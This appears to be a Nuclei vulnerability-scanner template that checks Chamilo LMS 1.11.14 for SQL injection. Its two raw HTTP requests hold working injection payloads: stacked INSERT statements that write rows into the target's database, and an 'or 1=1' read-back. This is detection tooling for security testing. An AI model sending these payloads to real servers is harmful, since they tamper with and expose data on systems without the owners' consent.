id: chamilo-lms-sqli
info:
  name: Chamilo 1.11.14 - SQL Injection
  author: undefl0w
  severity: critical
  description: Chamilo 1.11.14 is vulnerable to SQL injection, allowing attackers
    to extract sensitive information, modify data, and perform unauthorized administrative
    actions on the affected site.
  reference: https://packetstormsecurity.com/files/162572/Chamilo-LMS-1.11.14-Remote-Code-Execution.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: chamilo,sqli
  metadata:
    impact: The SQL injection vulnerability found in Chamilo 1.11.14 can have a severe
      impact, allowing attackers to gain unauthorized access to sensitive information
      and perform administrative operations.
    recommendation: It is highly recommended to immediately update Chamilo LMS version
      1.11.14 to the latest version to avoid potential SQL injection vulnerability
      threats.
requests:
- raw:
  - 'POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    type=image&field_id=image&tag=image&from=image&search=image&options=["test'');
    INSERT INTO extra_field_rel_tag(field_id, tag_id, item_id) VALUES (16, 16, 16);
    INSERT INTO extra_field_values(field_id, item_id,value) VALUES (16, 16,''{{randstr}}'');
    INSERT INTO extra_field_options(option_value) VALUES (''{{randstr}}''); INSERT
    INTO tag (id, tag, field_id,count) VALUES(16, ''{{randstr}}'', 16,0) ON DUPLICATE
    KEY UPDATE     tag=''{{randstr}}'', field_id=16, count=0;  -- "]

    '
  - 'POST /main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    type=image&field_id=image&tag=image&from=image&search=image&options=["test'')
    or 1=1 -- "]

    '
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - contains(body_2, "{{randstr}}")
